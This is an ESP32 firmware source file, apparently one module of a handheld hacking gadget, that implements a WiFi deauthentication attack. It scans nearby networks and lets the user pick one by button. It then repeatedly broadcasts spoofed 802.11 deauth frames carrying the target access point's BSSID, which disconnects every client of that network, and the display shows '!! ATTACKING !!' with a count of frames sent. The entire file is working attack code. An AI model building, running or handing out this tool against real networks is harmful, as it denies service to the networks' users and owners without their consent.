#include "deauth_attack.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

namespace deauth_attack {

enum class State { SCANNING, PICK, ATTACKING };
static State state = State::SCANNING;

static int scanCount = 0;
static int pickIdx = 0;
static uint8_t targetBssid[6];
static int targetChannel = 1;
static String targetSsid;
static uint16_t seqNum = 0;
static uint32_t sentCount = 0;
static uint32_t lastSendMs = 0;

static void startScan() {
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
    state = State::SCANNING;
}

void enter() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    pickIdx = 0;
    sentCount = 0;
    startScan();
}

void exit() {
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
}

// Builds a single deauth frame: 24-byte 802.11 header + 2-byte reason code.
// addr1=broadcast (hits every associated client), addr2/addr3=target AP
// BSSID (spoofed as the sender, so clients treat it as a legitimate
// instruction from their own AP).
static void sendDeauthBurst() {
    uint8_t frame[26] = {
        0xC0, 0x00,             // Frame Control: mgmt / deauth
        0x00, 0x00,             // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1: broadcast
        0, 0, 0, 0, 0, 0,       // addr2: target BSSID (filled below)
        0, 0, 0, 0, 0, 0,       // addr3: target BSSID (filled below)
        0x00, 0x00,             // Seq-ctrl (filled below)
        0x07, 0x00              // Reason code: class 3 frame from
                                 // nonassociated station
    };
    memcpy(&frame[10], targetBssid, 6);
    memcpy(&frame[16], targetBssid, 6);
    seqNum = (seqNum + 1) & 0x0FFF;
    frame[22] = (seqNum << 4) & 0xFF;
    frame[23] = (seqNum >> 4) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    sentCount++;
}

static void render() {
    ui.clear();

    if (state == State::SCANNING) {
        ui.header("Deauth Attack");
        ui.line(0, "Scanning...");
        ui.show();
        return;
    }

    if (state == State::PICK) {
        char hdr[24];
        snprintf(hdr, sizeof(hdr), "Pick target (%d)", scanCount);
        ui.header(hdr);
        if (scanCount == 0) {
            ui.line(0, "No networks found");
            ui.footer("LONG=rescan");
            ui.show();
            return;
        }
        String ssid = WiFi.SSID(pickIdx);
        if (ssid.length() == 0) ssid = "<hidden>";
        ui.linef(0, "%s", ssid.c_str());
        ui.linef(1, "ch %d", (int)WiFi.channel(pickIdx));
        ui.linef(2, "%s", WiFi.BSSIDstr(pickIdx).c_str());
        ui.footer("SHORT=next LONG=attack");
        ui.show();
        return;
    }

    // ATTACKING
    ui.header("!! ATTACKING !!");
    ui.linef(0, "%s", targetSsid.c_str());
    ui.linef(1, "ch %d", targetChannel);
    ui.linef(2, "sent: %lu", (unsigned long)sentCount);
    ui.footer("SHORT=stop");
    ui.show();
}

void loop(ButtonEvent ev) {
    if (state == State::SCANNING) {
        int n = WiFi.scanComplete();
        if (n >= 0) {
            scanCount = n;
            pickIdx = 0;
            state = State::PICK;
        } else if (n == WIFI_SCAN_FAILED) {
            scanCount = 0;
            state = State::PICK;
        }
    } else if (state == State::PICK) {
        if (ev == ButtonEvent::SHORT && scanCount > 0) {
            pickIdx = (pickIdx + 1) % scanCount;
        } else if (ev == ButtonEvent::LONG) {
            if (scanCount == 0) {
                startScan();
            } else {
                memcpy(targetBssid, WiFi.BSSID(pickIdx), 6);
                targetChannel = WiFi.channel(pickIdx);
                targetSsid = WiFi.SSID(pickIdx);
                if (targetSsid.length() == 0) targetSsid = "<hidden>";
                WiFi.scanDelete();
                esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
                sentCount = 0;
                lastSendMs = 0;
                state = State::ATTACKING;
            }
        }
    } else { // ATTACKING
        if (ev == ButtonEvent::SHORT) {
            state = State::PICK; // stop, back to target list (no rescan)
        } else {
            uint32_t now = millis();
            // Burst a handful of frames every ~100ms rather than flooding
            // the CPU/radio flat out.
            if (now - lastSendMs >= 100) {
                lastSendMs = now;
                for (int i = 0; i < 6; i++) sendDeauthBurst();
            }
        }
    }

    render();
}

} // namespace deauth_attack
